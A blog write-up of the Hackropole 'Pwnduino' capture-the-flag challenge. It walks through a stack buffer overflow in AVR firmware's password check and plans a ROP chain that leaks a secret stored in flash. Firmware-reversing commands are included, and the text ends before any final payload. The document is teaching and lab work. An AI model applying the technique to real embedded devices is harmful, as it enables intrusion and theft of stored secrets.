@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>PWN: AVR exploitation :: yocvito website</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="A basic embedded system exploitation challenge" />
+<meta name="keywords" content="write-up, pwn, avr" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="//localhost:1313/posts/pwn_hackropole-pwnduino/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/style.min.1cdbb7cf76923868c5b397f2052baabd091aedcc09ffebdd5da68e6d56712689.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/buttons.min.2bc533403a27dfe0e93105a92502b42ce4587e2e4a87d9f7d349e51e16e09478.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/code.min.00125962708925857e7b66dbc58391d55be1191a3d0ce2034de8c9cd2c481c36.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/fonts.min.4881f0c525f3ce2a1864fb6e96676396cebe1e6fcef1933e8e1dde7041004fb5.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/footer.min.2e3eb191baee58dd05a9f0104ac1fab0827bca7c64dafe0b2579f934c33a1d69.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/header.min.b6fb4423cf82a9f9d7abc9cd010223fa3d70a6526a3f28f8e17d814c06e18f9e.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/main.min.fe8dc560fccb53a458b0db19ccb7b265764ac46b68596b7e099c6793054dd457.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/menu.min.83637a90d903026bc280d3f82f96ceb06c5fc72b7c1a8d686afb5bbf818a29f7.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/pagination.min.82f6400eae7c7c6dc3c866733c2ec0579e4089608fea69400ff85b3880aa0d3c.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/post.min.fc74ca360273c1d828da3c02b8174eba435607b369d98418ccc6f2243cd4e75d.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/prism.min.9023bbc24533d09e97a51a0a42a5a7bfe4c591ae167c5551fb1d2191d11977c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/syntax.min.cc789ed9377260d7949ea4c18781fc58959a89287210fe4edbff44ebfc1511b6.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terminal.min.dc41063add420c2d2107bf5328b2f5abe23fb57e24dbc4fa9e7827b9f5bd8f9a.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="//localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="PWN: AVR exploitation">
+<meta property="og:description" content="A basic embedded system exploitation challenge" />
+<meta property="og:url" content="//localhost:1313/posts/pwn_hackropole-pwnduino/" />
+<meta property="og:site_name" content="yocvito website" />
+
+  
+  
+  <meta property="og:image" content="//localhost:1313/">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2024-10-30 15:44:39 &#43;0100 CET" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    yocvito
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about/about">About</a></li>
+        
+      
+        
+          <li><a href="/posts">Blog</a></li>
+        
+      
+        
+          <li><a href="/projects">Projects</a></li>
+        
+      
+        
+          <li><a href="/about/resume">Resume / CV</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about/about" >About</a></li>
+        
+      
+        
+          <li><a href="/posts" >Blog</a></li>
+        
+      
+        
+          <li><a href="/projects" >Projects</a></li>
+        
+      
+        
+          <li><a href="/about/resume" >Resume / CV</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/posts/pwn_hackropole-pwnduino/">PWN: AVR exploitation</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2024-10-30</time></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="//localhost:1313/tags/write-up/">write-up</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/pwn/">pwn</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/avr/">avr</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+    <div class="table-of-contents">
+      <h2>
+        Table of Contents
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#challenge-description">Challenge Description</a></li>
+    <li><a href="#source-code-analysis">Source code analysis</a></li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#plan">Plan</a></li>
+        <li><a href="#avr-internals">AVR Internals</a></li>
+        <li><a href="#firmware-analysis">Firmware Analysis</a>
+          <ul>
+            <li><a href="#reconstructing-the-firmware">Reconstructing the firmware</a></li>
+            <li><a href="#reversing">Reversing</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+  
+
+  <div class="post-content"><div>
+        <h1 id="pwn-hackropole---pwnduino">PWN: Hackropole - Pwnduino<a href="#pwn-hackropole---pwnduino" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p><a href="https://hackropole.fr/fr/challenges/pwn/fcsc2023-pwn-pwnduino/">This challenge</a> is about reversing and exploiting an <code>AVR</code> board (it&rsquo;s a CPU architecture by <em>Atmel</em> used in embedded devices).</p>
+<h2 id="challenge-description">Challenge Description<a href="#challenge-description" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>An industrial system uses an AVR board to store secrets and performs crypto primitives (calculate a custom <code>CRC</code>). We have access to the <code>debug</code> firmware and the source code. The AVR board service is accessible at <code>localhost:4000</code>.</p>
+<p>Let&rsquo;s first analyze the exposed service. We connect to it with <code>socat</code> and are prompted to enter a password until it got succesfully validated. It doesn&rsquo;t seem we can access other features until we enter correct password.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ socat tcp:localhost:4000 -
+</span></span><span style="display:flex;"><span>yo
+</span></span><span style="display:flex;"><span>KO :-<span style="color:#f92672">(</span> Bad password ...
+</span></span><span style="display:flex;"><span>Please enter your passphrase to compute CRC:
+</span></span><span style="display:flex;"><span>pass 
+</span></span><span style="display:flex;"><span>KO :-<span style="color:#f92672">(</span> Bad password ...
+</span></span><span style="display:flex;"><span>Please enter your passphrase to compute CRC:
+</span></span></code></pre></div><h2 id="source-code-analysis">Source code analysis<a href="#source-code-analysis" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p><strong>Project Structure:</strong></p>
+<p>We have two C files <code>main.c</code> and <code>uart.c</code> with their associated headers, which should holds the firmware logic. The header file <code>secrets_debug.h</code> (or <code>secrets_prod.h</code> for production) contains the secrets we want to leak (password and flag).</p>
+<p>By looking at the <code>Makefile.debug</code> file, we can retrieve the AVR board running the firmware which is an <code>ATmega2560</code> and is compiled with <code>avr-gcc</code>.
+The <code>EEPROM</code> section is removed from the firmware during compilation process.</p>
+<p>We will now explore the source code to understand logic and unveil potential vulns. The <code>main.c</code> file appears to be of first interest, we briefly look at <code>uart.c</code> to confirm it&rsquo;s a simple <code>UART</code> interface. We will assume it&rsquo;s not vulnerable for now, and eventually look at it if needed.</p>
+<blockquote>
+<p>The UART interface could, indeed, be interesting because implementing low level protocols need to be done in a careful way to avoid memory corruptions. But for this challenge, it&rsquo;s seems not to be the primary target and just here for communication logic.</p>
+</blockquote>
+<p><strong>main.c:</strong></p>
+<p>The main function remains simple. It initializes the UART interface, remove existing data in UART streams and run the main loop.</p>
+<p>The later asks for the password and check if it&rsquo;s correct (<code>password_check</code> function, we will look at it later). If not, it displays an error message and jump to loop start. Otherwise, it computes the CRC (an <code>uint8_t</code>) using the secret stored in <code>FLASH</code> memory (retrieved using <code>pgm_read_byte</code> AVR primitive) and write it to the EEPROM.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;avr/io.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ctype.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;avr/pgmspace.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;avr/eeprom.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;main.h&#34;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;uart.h&#34;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#if defined(PRODUCTION)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;secrets_prod.h&#34;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#else
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;secrets_debug.h&#34;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define SECRET_SIZE (sizeof(secret) - 1)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">get_secret_address</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> secret;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#a6e22e">compute_secret_crc</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> crc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, i;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_secret_address</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> SECRET_SIZE; i<span style="color:#f92672">++</span>){
+</span></span><span style="display:flex;"><span>		crc <span style="color:#f92672">^=</span> <span style="color:#a6e22e">pgm_read_byte</span>(<span style="color:#f92672">&amp;</span>(s[i]));
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> crc;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">passwd_check</span>(<span style="color:#66d9ef">void</span>){
+</span></span><span style="display:flex;"><span>    	<span style="color:#66d9ef">char</span> buff[<span style="color:#66d9ef">sizeof</span>(passwd)];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> check;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">memset</span>(buff, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buff));
+</span></span><span style="display:flex;"><span>	i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>){
+</span></span><span style="display:flex;"><span>		buff[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">uart_get</span>();
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(buff[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>){
+</span></span><span style="display:flex;"><span>			buff[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		i<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	check <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">sizeof</span>(passwd); i<span style="color:#f92672">++</span>){
+</span></span><span style="display:flex;"><span>		check <span style="color:#f92672">|=</span> (buff[i] <span style="color:#f92672">^</span> <span style="color:#a6e22e">pgm_read_byte</span>(<span style="color:#f92672">&amp;</span>(passwd[i])));
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> check;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uart_init</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uart_flush</span>();
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uart_puts</span>(<span style="color:#e6db74">&#34;=== Welcome!</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">uart_puts</span>(<span style="color:#e6db74">&#34;Please enter your passphrase to compute CRC:</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">passwd_check</span>() <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> crc;
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">uart_puts</span>(<span style="color:#e6db74">&#34;OK! Computing the secret CRC</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>			crc <span style="color:#f92672">=</span> <span style="color:#a6e22e">compute_secret_crc</span>();
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">uart_puts</span>(<span style="color:#e6db74">&#34;Writing CRC to EEPROM ...</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">eeprom_write_byte</span>(<span style="color:#ae81ff">0</span>, crc);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">uart_puts</span>(<span style="color:#e6db74">&#34;KO :-( Bad password ...</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>From here, we can say that the primary target for exploiting the challenge is the <code>passwd_check</code> function, because it&rsquo;s the only way to interact with the program if we don&rsquo;t have the password yet.</p>
+<p><strong>passwd_check:</strong></p>
+<p>The function is using UART primitives to read the user input into a local stack buffer (<code>buff</code>) with fixed size (<code>sizeof(passwd)</code>, 17 bytes). It then xor the input with the password stored in FLASH memory, add the result to an accumulator (<code>check</code>) and return the final result (which should be <code>0</code> on success).</p>
+<p>The problem here is that the user input retrieving code is not bounded on the size of <code>buff</code> and only stop when reaching an <code>'\n'</code> character. This means we can overflow the buffer and write arbitrary data onto the stack, which could lead to code execution.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> buff[<span style="color:#66d9ef">sizeof</span>(passwd)];      <span style="color:#75715e">// allocate to a certain size
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> check;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>(buff, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buff));
+</span></span><span style="display:flex;"><span>i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>){
+</span></span><span style="display:flex;"><span>    buff[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">uart_get</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(buff[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>){
+</span></span><span style="display:flex;"><span>        buff[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;              <span style="color:#75715e">// only breaks on &#39;\n&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
+</span></span><span style="display:flex;"><span>    i<span style="color:#f92672">++</span>;                <span style="color:#75715e">// i can go bigger than sizeof(buff)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><h2 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h3 id="plan">Plan<a href="#plan" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>Now that we are aware of a buffer overflow vulnerability, we need to think of a way to exploit it.</p>
+<p>Let&rsquo;s break down what we know:</p>
+<ul>
+<li><code>passwd_check</code> function is vulnerable to buffer overflow when retrieving user input
+<ul>
+<li>the checking of the password cannot be tempered as the overwritten variable <code>check</code> is set after the overflow happens (overwritting our changes)</li>
+</ul>
+</li>
+<li>the <code>secret</code> content is stored in <code>FLASH</code></li>
+<li>the only interface between attacker and the board is <code>UART</code></li>
+</ul>
+<p>Our final goal is to leak the stored secret. We would like to exploit the <code>passwd_check</code> function, make the program read the secret and display it on the UART interface.</p>
+<p>This requires to create a ROPchain that will retrieve the secret memory location with <code>get_secret_address</code>, and then use <code>pgm_read_byte</code> and <code>uart_putc</code> to display each byte of the secret. The involved ROPchain will not be so simple as we need to loop over each characters of the secret (incrementing the address and stopping when current char is <code>'\0'</code>)</p>
+<p>Luckily enough, the <code>uart.c</code> interface has a <code>uart_puts_p</code> function which already achieve this goal:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">uart_puts_p</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>str) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>(<span style="color:#a6e22e">pgm_read_byte</span>(str) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x00</span>) { 
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">uart_putc</span>(<span style="color:#a6e22e">pgm_read_byte</span>(str<span style="color:#f92672">++</span>));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This really simplify the exploit as we only need to retrieve the secret address and call this function.</p>
+<p>Now that we have our plan ready to exploit the firmware, we need to look at the compiled code with <strong>IDA</strong> or <strong>ghidra</strong> in order to craft the exploit script.</p>
+<blockquote>
+<p>I first choose to use ghidra because it has decompilers for AVR ATmega2560. I used it to better map correspondance between source and executable functions, but I finally ended up switching back to IDA and just reading assembly code, because decompiled code was not so clear.</p>
+</blockquote>
+<h3 id="avr-internals">AVR Internals<a href="#avr-internals" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>As I didn&rsquo;t know very much yet about AVR architectures, I used <a href="https://hackaday.io/course/176685-avr-architecture-assembly-reverse-engineering">this ressource</a> to learn AVR, and looked at the <a href="https://ww1.microchip.com/downloads/en/DeviceDoc/AVR-Instruction-Set-Manual-DS40002198A.pdf">instruction set manual</a> and <a href="https://ww1.microchip.com/downloads/aemDocuments/documents/OTH/ProductDocuments/DataSheets/ATmega640-1280-1281-2560-2561-Datasheet-DS40002211A.pdf">ATmega2560 datasheet</a> when needed. There is also interesting material in <a href="https://gcc.gnu.org/wiki/avr-gcc#Calling_Convention">avr-gcc documentation</a> about calling convention.</p>
+<p>What&rsquo;s important to care about in AVR architecture:</p>
+<ul>
+<li>Harvard architecture (CODE and DATA segments are separated, respectively in FLASH and RAM)</li>
+<li>CPU registers are located in first bytes of the RAM</li>
+<li>instructions are fixed size (16 or 32 bits)</li>
+<li><code>SP</code> and <code>FP</code> are <strong>not aligned</strong> (1-byte alignement)
+<ul>
+<li>a <code>PUSH</code> instruction pushes 1 byte</li>
+</ul>
+</li>
+<li><strong>return address is 2 or 3 bytes wide</strong>
+<ul>
+<li>could be empty for tail-called functions (leaf functions)</li>
+</ul>
+</li>
+<li><strong>memory locations and addresses are not always the same</strong>
+<ul>
+<li>the address used in <code>CALL</code>, or <code>JMP</code>, is: <code>mem_ea / 2</code> (which corresponds to the instruction offset)</li>
+<li>if you look at 2 consecutive 16-bits instructions in IDA or ghidra, you will see the address is only incremented by 1 (but actual memory location of the second instruction is 2 bytes far from first one)
+<img alt="consecutive instructions" src="/img/pwn-hackropole_pwnduino/consecutive-insns.png"></li>
+<li><strong>radare2</strong> is displaying memory location instead of instruction offsets (but the instruction offsets are still used by call/jmp instructions)</li>
+</ul>
+</li>
+</ul>
+<h3 id="firmware-analysis">Firmware Analysis<a href="#firmware-analysis" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<h4 id="reconstructing-the-firmware">Reconstructing the firmware<a href="#reconstructing-the-firmware" class="hanchor" ariaLabel="Anchor">#</a> </h4>
+<p>Let&rsquo;s say we don&rsquo;t have access to the source code, but only to the firmware binary. We could just load the binary into IDA and start reversing, but only the ROM would be recognized and loaded.</p>
+<p>In order to fix this, we can spot the <code>__do_copy_data</code> code (which copies data from FLASH to RAM at startup) and reconstruct the RAM, before loading it in IDA.</p>
+<p>Let&rsquo;s open the <code>firmware_debug.bin</code> file in IDA. Select AVR architecture and you will be prompt to select an AVR configuration file which defines memory layout, registers addresses, etc&hellip; The <code>ATmega640</code> shares same layout as our <code>ATmega2560</code> board except it has a smaller FLASH memory (64KB instead of 256KB). I modified the IDA AVR config file (<code>&lt;idapro-dir&gt;/cfg/avr.cfg</code>) to duplicate the entry and modify RAM size, you can find the modified file <a href="/ida-avr.cfg">here</a></p>
+<p>The first instruction at <code>0x0</code> should be a jump to address <code>0x86</code> (the <code>__RESET</code> handler). In this routine, we can find <code>__do_copy_data</code> at address <code>0x8e</code> (not labeled by default, click the current instruction and press <code>N</code> for renaming). Just after the loop, the reset handler call the <code>main</code>.</p>
+<p>The <code>__do_copy_data</code> code retrieves the RAM start address (specified in <a href="https://ww1.microchip.com/downloads/aemDocuments/documents/OTH/ProductDocuments/DataSheets/ATmega640-1280-1281-2560-2561-Datasheet-DS40002211A.pdf">board datasheet</a>) and FLASH address of data to copy. You can notice RAM address is copied into <code>X</code> register when FLASH address is written to <code>Z</code> register. Then it uses these pointers to set RAM memory with the <code>ELPM</code> instruction until it reaches the end of RAM data in FLASH.</p>
+<blockquote>
+<p>The <code>LPM</code> and <code>ELPM</code> instructions are used to access FLASH memory data.</p>
+</blockquote>
+<p><img alt="RESET handler code" src="/img/pwn-hackropole_pwnduino/reset_handler.png"></p>
+<p>We can see that:</p>
+<ul>
+<li>RAM start address is <code>0x200</code></li>
+<li>RAM data is located at <code>0x4BA</code> in FLASH (meaning we need to skip 1210 bytes in firmware file)</li>
+<li>RAM data in FLASH is 148 bytes long (<code>0x94</code>)</li>
+</ul>
+<p>Thus, we can use following commands to reconstruct the RAM:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dd <span style="color:#66d9ef">if</span><span style="color:#f92672">=</span>firmware_debug.bin of<span style="color:#f92672">=</span>/tmp/RAM.bin skip<span style="color:#f92672">=</span><span style="color:#ae81ff">1210</span> count<span style="color:#f92672">=</span><span style="color:#ae81ff">148</span> bs<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>dd <span style="color:#66d9ef">if</span><span style="color:#f92672">=</span>/dev/zero of<span style="color:#f92672">=</span>/tmp/RAM.bin seek<span style="color:#f92672">=</span><span style="color:#ae81ff">148</span> count<span style="color:#f92672">=</span><span style="color:#ae81ff">8043</span> bs<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Then verify RAM was correctly created:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ xxd /tmp/RAM.bin | head -n10
+</span></span><span style="display:flex;"><span>00000000: 3d3d 3d20 <span style="color:#ae81ff">5765</span> 6c63 6f6d <span style="color:#ae81ff">6521</span> 0d0a 0050  <span style="color:#f92672">===</span> Welcome!...P
+</span></span><span style="display:flex;"><span>00000010: 6c65 <span style="color:#ae81ff">6173</span> <span style="color:#ae81ff">6520</span> 656e <span style="color:#ae81ff">7465</span> <span style="color:#ae81ff">7220</span> 796f <span style="color:#ae81ff">7572</span>  lease enter your
+</span></span><span style="display:flex;"><span>00000020: <span style="color:#ae81ff">2070</span> <span style="color:#ae81ff">6173</span> <span style="color:#ae81ff">7370</span> <span style="color:#ae81ff">6872</span> <span style="color:#ae81ff">6173</span> <span style="color:#ae81ff">6520</span> 746f <span style="color:#ae81ff">2063</span>   passphrase to c
+</span></span><span style="display:flex;"><span>00000030: 6f6d <span style="color:#ae81ff">7075</span> <span style="color:#ae81ff">7465</span> <span style="color:#ae81ff">2043</span> <span style="color:#ae81ff">5243</span> 3a0d 0a00 4f4b  ompute CRC:...OK
+</span></span><span style="display:flex;"><span>00000040: <span style="color:#ae81ff">2120</span> 436f 6d70 <span style="color:#ae81ff">7574</span> 696e <span style="color:#ae81ff">6720</span> <span style="color:#ae81ff">7468</span> <span style="color:#ae81ff">6520</span>  ! Computing the 
